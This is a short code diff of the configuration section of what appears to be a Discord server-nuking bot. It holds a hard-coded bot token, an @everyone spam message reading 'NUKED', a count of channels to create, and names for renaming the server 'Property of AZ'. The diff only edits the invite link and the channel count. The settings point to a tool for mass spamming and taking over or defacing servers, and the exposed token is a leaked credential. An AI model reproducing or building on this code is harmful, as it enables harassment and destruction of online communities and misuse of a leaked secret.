@@ -5,8 +5,8 @@ from concurrent.futures import ThreadPoolExecutor
 
 
 bot_token = 'MTIwNjAxNTUyNTc1NTI4OTY0MA.GuNi07.dBCSthjseQRLoFmeeBpvSUjEPbU6EZKnli7dEo'
-spam_msg = '@everyone @here NUKED, https://discord.gg/noshoutout REKTED LOL' 
-channel_count = 60
+spam_msg = '@everyone @here NUKED, https://discord.gg/ REKTED LOL' 
+channel_count = 50
 channel_name = 'Nuked By AZ'
 server_rename = 'Property of AZ' 
 bot_prefix = '.' 
